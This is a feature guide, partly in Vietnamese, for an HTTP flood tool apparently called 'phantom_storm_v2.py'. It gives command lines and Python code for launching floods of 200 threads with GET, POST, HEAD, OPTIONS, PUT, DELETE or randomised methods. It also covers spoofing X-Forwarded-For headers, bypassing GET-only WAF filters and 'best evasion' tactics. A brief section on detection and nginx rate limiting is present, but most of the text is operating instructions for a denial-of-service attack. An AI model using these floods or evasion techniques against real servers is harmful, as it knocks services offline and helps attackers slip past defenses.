# 🚀 HTTP Methods Variation - Feature Guide

## 📖 Tổng Quan

Feature mới trong v2.5 cho phép sử dụng **nhiều HTTP methods khác nhau** thay vì chỉ GET, giúp:
- Đa dạng hóa attack patterns
- Bypass các filter chỉ check GET requests
- Test khả năng phòng thủ của server với các methods khác nhau
- Simulate real-world mixed traffic

---

## ✨ Supported HTTP Methods

| Method | Mô Tả | Use Case |
|--------|-------|----------|
| **GET** | Request standard | Mặc định, phổ biến nhất |
| **POST** | Gửi data trong body | Form submissions, API calls |
| **HEAD** | Như GET nhưng không có body | Metadata requests |
| **OPTIONS** | Query allowed methods | CORS preflight, discovery |
| **PUT** | Upload/update resource | RESTful APIs |
| **DELETE** | Xóa resource | RESTful APIs |

---

## 🎯 Cách Sử Dụng

### 1. Sử Dụng Method Cụ Thể

#### Command Line

```bash
# GET (mặc định)
python phantom_storm_v2.py 192.168.1.100 80 200

# POST flood
python phantom_storm_v2.py 192.168.1.100 80 200 --method=POST

# HEAD flood
python phantom_storm_v2.py 192.168.1.100 80 200 --method=HEAD

# OPTIONS flood
python phantom_storm_v2.py 192.168.1.100 80 200 --method=OPTIONS

# PUT attack
python phantom_storm_v2.py 192.168.1.100 80 200 --method=PUT

# DELETE attack
python phantom_storm_v2.py 192.168.1.100 80 200 --method=DELETE
```

#### Python Code

```python
from src import AttackWorker, AttackStatistics, HTTPMethod

stats = AttackStatistics()

# POST attack
worker = AttackWorker(
    target_ip="192.168.1.100",
    target_port=80,
    stats=stats,
    worker_id=1,
    http_method=HTTPMethod.POST  # ← Specify method
)
```

---

### 2. Random Methods (Recommended!)

Sử dụng **random method** cho mỗi request để đa dạng hóa:

#### Command Line

```bash
python phantom_storm_v2.py 192.168.1.100 80 200 --random-method
```

**Kết quả:** Mỗi connection sẽ random giữa GET, POST, HEAD, OPTIONS

#### Python Code

```python
worker = AttackWorker(
    target_ip="192.168.1.100",
    target_port=80,
    stats=stats,
    worker_id=1,
    randomize_method=True  # ← Random methods!
)
```

---

### 3. Kết Hợp Với IP Spoofing

```bash
# Random methods + IP spoofing
python phantom_storm_v2.py 192.168.1.100 80 200 --random-method

# POST + IP spoofing
python phantom_storm_v2.py 192.168.1.100 80 200 --method=POST

# POST without spoofing
python phantom_storm_v2.py 192.168.1.100 80 200 --method=POST --no-spoof
```

---

## 📊 Output Examples

### GET Attack (Standard)

```
[+] HTTP Method: GET
[*] Launching attack on 192.168.1.100:80
[*] Spawning 200 attack threads...
[*] Using HTTP method: GET

[Runtime: 00:01:30]
├─ Active Connections    : 187
├─ Total Established     : 200
├─ Success Rate          : 100.00%
```

### POST Attack

```
[+] HTTP Method: POST
[*] Each request will include POST body data
[*] Using HTTP method: POST

[Runtime: 00:01:30]
├─ Active Connections    : 189
├─ Total Packets Sent    : 1,234
```

### Random Methods Attack

```
[+] HTTP Method: RANDOM (GET/POST/HEAD/OPTIONS)
[*] Using random HTTP methods for each request

[Runtime: 00:01:30]
├─ Active Connections    : 185
├─ Unique IPs Used       : 185
```

---

## 🧪 Testing & Examples

### Run Demo

```bash
cd examples
python http_methods_demo.py
```

**Demo includes:**
1. Show all available methods
2. POST flood attack
3. Random methods attack

### Run Unit Tests

```bash
cd tests
python test_http_methods.py
```

**Tests cover:**
- ✅ GET request building
- ✅ POST request with body
- ✅ HEAD request
- ✅ OPTIONS request
- ✅ Random method generation
- ✅ Spoofing headers in all methods
- ✅ Non-spoofed requests

---

## 🎯 Use Cases

### 1. Bypass GET-Only Filters

Một số WAF chỉ filter GET requests:

```bash
# WAF block GET → Try POST
python phantom_storm_v2.py target 80 200 --method=POST
```

### 2. Test API Endpoints

```bash
# Test REST API với PUT/DELETE
python phantom_storm_v2.py api.target.com 443 100 --method=DELETE
```

### 3. Mixed Traffic Simulation

```bash
# Simulate real users (random methods)
python phantom_storm_v2.py target 80 200 --random-method
```

### 4. POST Flood with Data

POST requests automatically include random body data:

```
username=user1234&password=pass5678
search=9876&page=42
data=1234&token=567890
```

---

## 📝 HTTP Request Structure

### GET Request

```http
GET /?storm=123456 HTTP/1.1
Host: 192.168.1.100
User-Agent: Mozilla/5.0 ...
X-Forwarded-For: 203.45.67.89
X-Real-IP: 203.45.67.89
Accept: text/html,application/xhtml+xml
Connection: keep-alive
Keep-Alive: timeout=300, max=1000
```

### POST Request

```http
POST /?storm=123456 HTTP/1.1
Host: 192.168.1.100
User-Agent: Mozilla/5.0 ...
X-Forwarded-For: 203.45.67.89
X-Real-IP: 203.45.67.89
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Connection: keep-alive

username=user1234&password=pass5678
```

### HEAD Request

```http
HEAD /?storm=123456 HTTP/1.1
Host: 192.168.1.100
User-Agent: Mozilla/5.0 ...
X-Forwarded-For: 203.45.67.89
Accept: */*
Connection: keep-alive
```

---

## 🛡️ Defense Perspective

### Làm Sao Detect HTTP Method Attacks?

**Monitor Nginx/Apache logs:**

```bash
# Count methods
sudo awk '{print $6}' /var/log/nginx/access.log | sort | uniq -c

# Example output:
   5000 "GET     ← Normal
    500 "POST    ← Suspicious spike
    300 "HEAD    ← Unusual
    200 "OPTIONS ← Very unusual
```

**Abnormal patterns:**
- Đột nhiên nhiều POST requests không có valid data
- HEAD/OPTIONS requests spike
- PUT/DELETE từ IPs không authorized

### Defense Config

```nginx
# Giới hạn methods allowed
location / {
    limit_except GET POST {
        deny all;  # Block HEAD, OPTIONS, PUT, DELETE
    }
    
    limit_req zone=mylimit burst=5 nodelay;
}

# Rate limit riêng cho POST
limit_req_zone $request_method zone=post_limit:10m rate=5r/s;

location / {
    if ($request_method = POST) {
        limit_req zone=post_limit burst=3;
    }
}
```

---

## 🔧 Advanced Usage

### Custom Method in Python

```python
from src import HTTPMethodBuilder

# Build custom GET request
request = HTTPMethodBuilder.build_get(
    target_ip="192.168.1.100",
    path="/api/v1/data?id=123",
    spoofed_ip="203.45.67.89",
    custom_headers={
        "Authorization": "Bearer fake_token",
        "X-Custom-Header": "custom_value"
    }
)

print(request)
```

### Custom POST Body

```python
# Build POST with custom body
request = HTTPMethodBuilder.build_post(
    target_ip="192.168.1.100",
    path="/submit",
    body_data="custom=data&field=value",
    spoofed_ip="203.45.67.89"
)
```

---

## 📊 Performance Comparison

| Method | Body Size | Bandwidth Usage | Server Load |
|--------|-----------|-----------------|-------------|
| **GET** | 0 bytes | Low | Low |
| **POST** | ~50 bytes | Medium | Medium |
| **HEAD** | 0 bytes | Very Low | Low |
| **OPTIONS** | 0 bytes | Very Low | Low |
| **PUT** | ~50 bytes | Medium | Medium |
| **DELETE** | 0 bytes | Low | Low |

**Recommendation:** 
- **Stealthy attack:** HEAD, OPTIONS (low bandwidth)
- **Heavy attack:** POST, PUT (higher load)
- **Balanced:** Random methods

---

## ❓ FAQ

### Q: Tại sao không dùng PATCH, CONNECT, TRACE?

**A:** Các methods này ít phổ biến và dễ bị filter. Tool focus vào 6 methods quan trọng nhất.

### Q: POST body có random không?

**A:** Có! Tool tự động generate random POST data với các patterns như:
- `username=userXXXX&password=passXXXX`
- `search=XXXX&page=XX`
- `data=XXXX&token=XXXXXX`

### Q: Method nào hiệu quả nhất?

**A:** Tùy target:
- **GET**: Universal, works everywhere
- **POST**: Bypass GET-only filters
- **Random**: Best for evasion

### Q: Có thể combine nhiều methods trong 1 lần chạy?

**A:** Có! Dùng `--random-method` flag.

---

## 🎯 Best Practices

1. ✅ **Start with GET** - Test baseline effectiveness
2. ✅ **Try POST if GET blocked** - Some filters only check GET
3. ✅ **Use random methods** - Best evasion against pattern detection
4. ✅ **Combine with IP spoofing** - Maximum effectiveness
5. ✅ **Monitor target response** - Adjust strategy based on feedback

---

## 🚀 What's Next?

### Future Enhancements (v3.0)

- [ ] Custom body templates for POST/PUT
- [ ] JSON body support
- [ ] Multipart form-data
- [ ] WebSocket upgrade requests
- [ ] HTTP/2 support

---

**🎉 Enjoy diversified HTTP attacks!**

**Last Updated:** v2.5 Ultimate Edition
